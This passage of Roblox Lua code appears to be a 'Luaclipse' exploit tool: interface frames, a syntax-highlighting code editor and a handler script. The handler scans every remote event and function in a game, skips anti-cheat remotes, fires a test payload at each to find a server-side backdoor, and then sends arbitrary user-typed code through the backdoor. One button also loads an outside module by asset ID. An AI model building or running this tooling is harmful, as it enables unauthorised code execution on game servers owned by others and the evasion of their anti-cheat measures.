-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.X_Rght.Arrow.Frame
LUA["31"] = Instance.new("Frame", LUA["2e"]);
LUA["31"]["BorderSizePixel"] = 0;
LUA["31"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
LUA["31"]["Size"] = UDim2.new(0, 1, 0, 5);
LUA["31"]["Position"] = UDim2.new(0, 8, 0, 6);
LUA["31"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.X_Rght.Arrow.Frame
LUA["32"] = Instance.new("Frame", LUA["2e"]);
LUA["32"]["BorderSizePixel"] = 0;
LUA["32"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
LUA["32"]["Size"] = UDim2.new(0, 1, 0, 7);
LUA["32"]["Position"] = UDim2.new(0, 7, 0, 5);
LUA["32"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Ground
LUA["33"] = Instance.new("Frame", LUA["b"]);
LUA["33"]["Visible"] = false;
LUA["33"]["ZIndex"] = 2;
LUA["33"]["BorderSizePixel"] = 0;
LUA["33"]["BackgroundColor3"] = Color3.fromRGB(55, 55, 55);
LUA["33"]["Size"] = UDim2.new(0, 17, 0, 17);
LUA["33"]["Position"] = UDim2.new(1, -17, 1, -17);
LUA["33"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LUA["33"]["Name"] = [[Ground]];


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Y_Bar
LUA["34"] = Instance.new("Frame", LUA["b"]);
LUA["34"]["Visible"] = false;
LUA["34"]["ZIndex"] = 2;
LUA["34"]["BorderSizePixel"] = 0;
LUA["34"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
LUA["34"]["Size"] = UDim2.new(0, 17, 1, -17);
LUA["34"]["Position"] = UDim2.new(1, -17, 0, 0);
LUA["34"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LUA["34"]["Name"] = [[Y_Bar]];
LUA["34"]["BackgroundTransparency"] = 1;


-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.X_Bar
LUA["35"] = Instance.new("Frame", LUA["b"]);
LUA["35"]["Visible"] = false;
LUA["35"]["ZIndex"] = 2;
LUA["35"]["BorderSizePixel"] = 0;
LUA["35"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
LUA["35"]["Size"] = UDim2.new(1, -17, 0, 17);
LUA["35"]["Position"] = UDim2.new(0, 0, 1, -17);
LUA["35"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
LUA["35"]["Name"] = [[X_Bar]];
LUA["35"]["BackgroundTransparency"] = 1;


-- StarterGui.Luaclipse.TopBar.MainFrame.R6RE
LUA["36"] = Instance.new("TextButton", LUA["6"]);
LUA["36"]["BorderSizePixel"] = 2;
LUA["36"]["TextSize"] = 42;
LUA["36"]["AutoButtonColor"] = false;
LUA["36"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LUA["36"]["BackgroundColor3"] = Color3.fromRGB(33, 33, 33);
LUA["36"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
LUA["36"]["AnchorPoint"] = Vector2.new(0.5, 0);
LUA["36"]["Size"] = UDim2.new(1, -350, 0, 50);
LUA["36"]["BorderColor3"] = Color3.fromRGB(33, 33, 33);
LUA["36"]["Text"] = [[R6/RE]];
LUA["36"]["Name"] = [[R6RE]];
LUA["36"]["Visible"] = false;
LUA["36"]["Position"] = UDim2.new(0, 478, 0, 285);


-- StarterGui.Luaclipse.TopBar.Handler
LUA["37"] = Instance.new("LocalScript", LUA["2"]);
LUA["37"]["Name"] = [[Handler]];


-- StarterGui.Luaclipse.TopBar.Version
LUA["38"] = Instance.new("TextLabel", LUA["2"]);
LUA["38"]["BorderSizePixel"] = 0;
LUA["38"]["TextSize"] = 24;
LUA["38"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LUA["38"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Heavy, Enum.FontStyle.Normal);
LUA["38"]["TextColor3"] = Color3.fromRGB(126, 126, 126);
LUA["38"]["BackgroundTransparency"] = 1;
LUA["38"]["Size"] = UDim2.new(0, 0, 0, 24);
LUA["38"]["Text"] = [[v1]];
LUA["38"]["AutomaticSize"] = Enum.AutomaticSize.X;
LUA["38"]["Name"] = [[Version]];
LUA["38"]["Position"] = UDim2.new(0, 193, 1, -32);


-- StarterGui.Luaclipse.TopBar.UIDragDetector
LUA["39"] = Instance.new("UIDragDetector", LUA["2"]);



-- StarterGui.Luaclipse.TopBar.MainFrame.FastColoredTextbox.Handler
local function C_16()
local script = LUA["16"];
	--# FastColoredTextBox v3 by: C:\Drive
	
	local fctbelements = {
		scroll = script.Parent.Scroll,
		textbox = script.Parent.Scroll.TextBox,
		cursor = script.Parent.Scroll.Cursor,
		selector = script.Parent.Scroll.LineSelector,
		lines = script.Parent.Scroll.LinesFrame,
		linetemp = script.Parent.Scroll.LinesFrame.TextLabelTemplate,
		highlighting = script.Parent.Scroll.Highlighting,
		measurer = script.Parent.Scroll.TextMeasurer,
		linesvalue = script.Parent.Scroll.LinesValue,
	}
	
	--# Automatic Scrolling (1/7)
	local scrollingframe = fctbelements.scroll
	local textbox = fctbelements.textbox
	local textservice = game:GetService("TextService")
	
	local function updatecanvassize()
		local textsize = textservice:GetTextSize(textbox.Text, textbox.TextSize, textbox.Font, Vector2.new(math.huge, math.huge))
		scrollingframe.CanvasSize = UDim2.new(0, textsize.X + 20, 0, textsize.Y)
	end
	
	--textbox:GetPropertyChangedSignal("Text"):Connect(updatecanvassize) --- MOVED THIS CODE TO LINE 257 OR SOMEWHERE NEAR THAT
	updatecanvassize()
	
	--# Line Checker (2/7)
	local textbox = fctbelements.textbox
	local linesvalue = fctbelements.linesvalue
	
	local function countlines(text)
		return select(2, text:gsub("\n", "\n")) + 1
	end
	
	local lastlinecount = countlines(textbox.Text)
	
	textbox:GetPropertyChangedSignal("Text"):Connect(function()
		local currentlinecount = countlines(textbox.Text)
		if currentlinecount ~= lastlinecount then
			linesvalue.Value += currentlinecount - lastlinecount
			lastlinecount = currentlinecount
		end
	end)
	
	--# Lines (3/7)
	local scrollingframe = fctbelements.scroll
	local frame = fctbelements.lines
	local template = fctbelements.linetemp
	local linesvalue = fctbelements.linesvalue
	
	local clones = {}
	local currentlinecount = 1
	
	linesvalue:GetPropertyChangedSignal("Value"):Connect(function()
		local newlinecount = linesvalue.Value
		if newlinecount > currentlinecount then
			for _ = 1, newlinecount - currentlinecount do
				local clone = template:Clone()
				clone.Visible = true
				clone.Text = tostring(#clones + 2)
				clone.Parent = frame
				table.insert(clones, clone)
			end
		elseif newlinecount < currentlinecount then
			for _ = 1, currentlinecount - newlinecount do
				local lastclone = table.remove(clones)
				if lastclone then lastclone:Destroy() end
			end
		end
		currentlinecount = newlinecount
	end)
	
	--# Cursor (4/7)
	local fasttextbox = fctbelements.scroll
	local textbox = fasttextbox:WaitForChild("TextBox")
	local cursorframe = fasttextbox:WaitForChild("Cursor")
	local measurer = fasttextbox:WaitForChild("TextMeasurer")
	local blinkinterval = 0.5
	local lineheight = textbox.TextSize
	
	cursorframe.Size = UDim2.new(0, 1, 0, lineheight)
	cursorframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	
	local function updatecursor()
		local cursorpos = textbox.CursorPosition
		if cursorpos <= 0 then
			cursorframe.Visible = false
			return
		end
		local textbeforecursor = textbox.Text:sub(1, cursorpos - 1)
		local linenumber = select(2, textbeforecursor:gsub("\n", "\n")) + 1
		local currentlinetext = textbeforecursor:match(".*()\n") and textbeforecursor:sub(textbeforecursor:match(".*()\n") + 1) or textbeforecursor
	
		measurer.Text = currentlinetext
		cursorframe.Position = UDim2.new(0, measurer.TextBounds.X + 17, 0, (linenumber - 1) * lineheight)
		cursorframe.Visible = true
	end
	
	local function blink()
		while true do
			cursorframe.Visible = not cursorframe.Visible
			wait(blinkinterval)
		end
	end
	
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(updatecursor)
	textbox:GetPropertyChangedSignal("Text"):Connect(updatecursor)
	spawn(blink)
	updatecursor()
	
	--# Selector (5/7)
	local fasttextbox = fctbelements.scroll
	local textbox = fasttextbox:WaitForChild("TextBox")
	local selector = fasttextbox:WaitForChild("LineSelector")
	local lineheight = textbox.TextSize
	selector.BackgroundTransparency = 0.85
	
	local tweenservice = game:GetService("TweenService")
	local tweeninfo = TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	
	local function updatelineselector()
		local cursor = textbox.CursorPosition
		if cursor <= 0 then
			selector.Visible = false
			return
		end
		local linenumber = select(2, textbox.Text:sub(1, cursor):gsub("\n", "\n")) + 1
		tweenservice:Create(selector, tweeninfo, {
			Position = UDim2.new(0, 17, 0, (linenumber - 1) * lineheight),
			Size = UDim2.new(1, 0, 0, lineheight),
		}):Play()
		selector.Visible = true
	end
	
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(updatelineselector)
	textbox:GetPropertyChangedSignal("Text"):Connect(updatelineselector)
	updatelineselector()
	
	--# Syntax Highlighting (6/7)
	local scrollingframe = fctbelements.scroll
	local textbox = scrollingframe:WaitForChild("TextBox")
	local highlightlabel = scrollingframe:WaitForChild("Highlighting")
	
	local keywords = {
		["and"] = "keyword", ["break"] = "keyword", ["do"] = "keyword",
		["else"] = "keyword", ["elseif"] = "keyword", ["end"] = "keyword",
		["false"] = "keyword", ["for"] = "keyword", ["function"] = "keyword",
		["if"] = "keyword", ["in"] = "keyword", ["local"] = "keyword",
		["nil"] = "keyword", ["not"] = "keyword", ["or"] = "keyword",
		["repeat"] = "keyword", ["return"] = "keyword", ["then"] = "keyword",
		["true"] = "keyword", ["until"] = "keyword", ["while"] = "keyword",
		["require"] = "function", ["goto"] = "keyword", ["self"] = "keyword",
		["print"] = "function", ["pairs"] = "function", ["ipairs"] = "function",
		["next"] = "function", ["tonumber"] = "function", ["tostring"] = "function",
		["type"] = "function", ["pcall"] = "function", ["xpcall"] = "function",
		["coroutine"] = "global", ["table"] = "global", ["string"] = "global",
		["math"] = "global", ["os"] = "global",
		["assert"] = "function", ["error"] = "function", ["rawget"] = "function",
		["rawset"] = "function",
		["game"] = "global", ["workspace"] = "global", ["script"] = "global",
		["Instance"] = "type", ["Vector3"] = "type", ["CFrame"] = "type",
		["Color3"] = "type", ["UDim2"] = "type", ["Enum"] = "type",
		["wait"] = "function", ["delay"] = "function", ["spawn"] = "function",
		["tick"] = "function", ["time"] = "function",
		["Vector2"] = "type", ["BrickColor"] = "type", ["Region3"] = "type",
		["Ray"] = "type", ["task"] = "global", ["RunService"] = "global",
		["UserInputService"] = "global",
	}
	
	local colormap = {
		keyword   = Color3.fromRGB(248, 109, 124),
		["function"] = Color3.fromRGB(132, 214, 247),
		["global"]   = Color3.fromRGB(132, 214, 247),
		["type"]     = Color3.fromRGB(132, 214, 247),
		string    = Color3.fromRGB(173, 241, 149),
		comment   = Color3.fromRGB(145, 145, 145),
		number    = Color3.fromRGB(255, 198, 0),
		operator  = Color3.fromRGB(200, 200, 200),
	}
	
	local function rgb(c)
		return math.floor(c.R * 255), math.floor(c.G * 255), math.floor(c.B * 255)
	end
	
	local function colored(text, kind)
		local c = colormap[kind]
		if not c then return text end
		local r,g,b = rgb(c)
		return `<font color="rgb({r},{g},{b})">{text}</font>`
	end
	
	local function highlight(code)
		local result = ""
		local i = 1
		while i <= #code do
			if code:sub(i, i+1) == "--" then
				local comment = code:sub(i):match("^%-%-[^\n]*")
				result ..= colored(comment, "comment")
				i += #comment
			elseif code:sub(i, i) == '"' or code:sub(i, i) == "'" then
				local quote = code:sub(i, i)
				local s, e = code:find(quote..".-"..quote, i)
				local str = s and code:sub(s, e) or quote
				result ..= colored(str, "string")
				i = s and e + 1 or i + 1
			elseif code:sub(i):match("^%d") then
				local num = code:sub(i):match("^%d+%.?%d*")
				result ..= colored(num, "number")
				i += #num
			elseif code:sub(i):match("^%a") then
				local word = code:sub(i):match("^[%a_][%w_]*")
				local kind = keywords[word]
				if kind then
					result ..= colored(word, kind)
				else
					result ..= word
				end
				i += #word
			elseif code:sub(i):match("^[%p]") then
				result ..= colored(code:sub(i,i), "operator")
				i += 1
			else
				result ..= code:sub(i, i)
				i += 1
			end
		end
		return result
	end
	
	local function sync()
		highlightlabel.Text = highlight(textbox.Text)
		highlightlabel.Size = textbox.Size
		highlightlabel.Position = textbox.Position
	end
	
	textbox:GetPropertyChangedSignal("Text"):Connect(sync)
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(sync)
	textbox:GetPropertyChangedSignal("Size"):Connect(sync)
	sync()
	
	--# Scrollbar Buttons (7/7)
	local ground = script.Parent.Ground
	
	local buttons = {
		y = {
			top = script.Parent.Y_Top,
			btm = script.Parent.Y_Btm,
		},
		x = {
			lft = script.Parent.X_Lft,
			rght = script.Parent.X_Rght,
		}
	}
	
	local bars = {
		y = script.Parent.Y_Bar,
		x = script.Parent.X_Bar,
	}
	
	buttons.y.top.Visible = false
	buttons.y.btm.Visible = false
	buttons.x.rght.Visible = false
	buttons.x.lft.Visible = false
	ground.Visible = false
	
	fctbelements.textbox:GetPropertyChangedSignal("Text"):Connect(function()
		updatecanvassize()
		if fctbelements.scroll.CanvasSize.Y.Offset > (fctbelements.scroll.AbsoluteSize.Y - 16) then
			buttons.y.top.Visible = true
			buttons.y.btm.Visible = true
			--bars.y.Visible = true
		else
			buttons.y.top.Visible = false
			buttons.y.btm.Visible = false
			--bars.y.Visible = false
		end
		
		if fctbelements.scroll.CanvasSize.X.Offset > fctbelements.scroll.AbsoluteSize.X then
			buttons.x.lft.Visible = true
			buttons.x.rght.Visible = true
			--bars.x.Visible = true
		else
			buttons.x.lft.Visible = false
			buttons.x.rght.Visible = false
			--bars.x.Visible = false
		end
		
		if fctbelements.scroll.CanvasSize.Y.Offset > (fctbelements.scroll.AbsoluteSize.Y - 16) and fctbelements.scroll.CanvasSize.X.Offset > fctbelements.scroll.AbsoluteSize.X then
			buttons.y.btm.Position = UDim2.new(1, -17, 1, -34)
			buttons.x.rght.Position = UDim2.new(1, -34, 1, -17)
			ground.Visible = true
		else
			buttons.y.btm.Position = UDim2.new(1, -17, 1, -17)
			buttons.x.rght.Position = UDim2.new(1, -18, 1, -17)
			ground.Visible = false
		end
	end)
end;
task.spawn(C_16);
-- StarterGui.Luaclipse.TopBar.Handler
local function C_37()
local script = LUA["37"];
	--[[ VARIABLES ]]--
	
	local player = game:GetService("Players").LocalPlayer
	
	local sgui = script.Parent.Parent
	local topbar = sgui:FindFirstChild("TopBar")
	local mainframe = topbar:FindFirstChild("MainFrame")
	local logexample = mainframe.Console:FindFirstChild("Example")
	local textbox = mainframe.FastColoredTextbox.Scroll:FindFirstChild("TextBox")
	local buttons = {
		topbar:FindFirstChild("Exit"), --// 1
		mainframe:FindFirstChild("Attach"), --// 2
		mainframe:FindFirstChild("R6RE"), --// 3
	}
	
	local blacklistedstrings = {"CheatDetected", "ExploitDetected","MouseLock","MouseLoc"}
	local info = {
		repetition = 32, --// Basically how many times the payload will be checked if it ran (the number will be in miliseconds)
		remote = nil,
		backdoored = false,
		debugmode = false, --// This just give me more information to work with, don't worry about it
	}
	
	--[[ FUNCTIONS ]]--
	
	local function createlog(statement: string)
		local clone = logexample:Clone()
		clone.Parent = logexample.Parent
		clone.Text = " "..statement
		clone.Visible = true
	end
	
	local function fire(remote: RemoteEvent | RemoteFunction, code)
		if remote == nil then return end
	
		pcall(function()
			if remote:IsA("RemoteEvent") then
				remote:FireServer(code)
			elseif remote:IsA("RemoteFunction") then
				coroutine.wrap(function()
					return remote:InvokeServer(code)
				end)()
			end
		end)
	end
	
	local function checkremote(remote: RemoteEvent | RemoteFunction)
		for _, str in ipairs(blacklistedstrings) do
			if string.find(remote.Name:lower(), str:lower()) then
				return true
			end
		end
		if remote:FindFirstChild("__FUNCTION") or remote.Name == "__FUNCTION" or remote.Name == "CharacterSoundEvent" then
			return true
		end
		if remote.Parent.Parent then
			if remote.Parent.Parent.Name == "HDAdminClient" and remote.Parent.Name == "Signals" then
				return true
			end
			if remote.Parent.Name == "RobloxReplicatedStorage" 
				or remote.Parent.Name == "DefaultChatSystemChatEvents" then
				return true
			end
		end
		return false
	end
	
	local function initializepanel()
		mainframe.Console.Visible = false
		buttons[2].Interactable = true
		buttons[2].Text = "Execute"
		buttons[2].Size = UDim2.new(1, -340,0, 50)
		buttons[2].Position = UDim2.new(0, 165,0, 285)
		buttons[3].Visible = true
		textbox.Parent.Parent.Visible = true
		
		topbar:TweenSize(UDim2.new(0, 640,0, 54),"Out","Sine",1,false)
	end
	
	--[[ INTRO ]]--
	
	pcall(function()
		topbar.Size = UDim2.new(0,0,0,54)
		topbar.BorderSizePixel = 0
		mainframe.Size = UDim2.new(1,0,0,0)
		topbar.ClipsDescendants = true
		
		if info.debugmode then wait(1) end
		
		topbar.BorderSizePixel = 2
		topbar:TweenSize(UDim2.new(0, 320,0, 54),"Out","Sine",0.3,false)
		wait(0.5)
		topbar.ClipsDescendants = false
		mainframe:TweenSize(UDim2.new(1, 0,0, 350),"Out","Sine",0.3,false)
	end)
	
	--[[ SCANNNING ]]--
	local testpartname: string = "luaclipse_"..tostring(math.random(10000,99999))
	local payload = [[Instance.new("FluidForceSensor", game:GetService("SoundService")).Name = "]]..testpartname..[["]]
	
	local remotes = {}
	local timer: number = 0
	
	local function checkpayload(remote: RemoteEvent | RemoteFunction)
		fire(remote,payload)
		for i = 1, info.repetition do
			if info.debugmode then print(i) end
			if game:GetService("SoundService"):FindFirstChild(testpartname) then
				return true
			end
			task.wait(0.01)
		end
		return false
	end
	
	local function scan()
		coroutine.wrap(function()
			repeat
				timer += 0.01
				task.wait(0.01)
			until info.backdoored
		end)()
		
		table.clear(remotes)
		
		for _, remote in ipairs(game:GetDescendants()) do
			if remote.Parent == nil then return end
			
			if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
				if checkremote(remote) then
					continue
				else
					table.insert(remotes,remote)
				end
			end
		end
		
		createlog("Scanning: "..#remotes.." remotes")
		
		for _, remote: RemoteEvent | RemoteFunction in ipairs(remotes) do
			createlog("Testing: "..remote.Name)
			if checkpayload(remote) then
				info.backdoored = true
				info.remote = remote
				fire(remote,[[game:GetService("SoundService"):FindFirstChild("]]..testpartname..[["):Destroy()]])
				break
			end
		end
		
		if info.backdoored and info.remote then
			createlog("Found a backdoor: "..info.remote.Name)
			createlog("Found in: "..timer.." seconds")
			if not info.debugmode then wait(1) end
			initializepanel()
		else
			createlog("No backdoors found\nExiting script safely...")
		end
	end
	
	--[[ BUTTON FUNCTIONS ]]--
	
	for _, button: TextButton in ipairs(buttons) do
		button.MouseEnter:Connect(function()
			button.BackgroundColor3 = Color3.fromRGB(24,24,24)
		end)
		button.MouseLeave:Connect(function()
			button.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
		end)
	end
	
	buttons[1].MouseButton1Click:Connect(function()
		pcall(function()
			topbar:TweenPosition(UDim2.new(topbar.Position.X.Scale,topbar.Position.X.Offset,-2,0),"In","Back",1,true)
			wait(1)
			sgui:Destroy()
		end)
		return
	end)
	
	buttons[2].MouseButton1Click:Connect(function()
		if not info.backdoored and not info.remote then
			buttons[2].Interactable = false
			scan()
		else
			fire(info.remote,textbox.Text)
		end
	end)
	
	buttons[3].MouseButton1Click:Connect(function()
		fire(info.remote,[[
	game:GetService("Players"):FindFirstChild("]]..player.Name..[["):LoadCharacter()
	task.wait(0.02)
	require(3436957371):r6(game:GetService("Players"):FindFirstChild("]]..player.Name..[[").Name)
			]])
	end)
end;
task.spawn(C_37);

return LUA["1"], require;
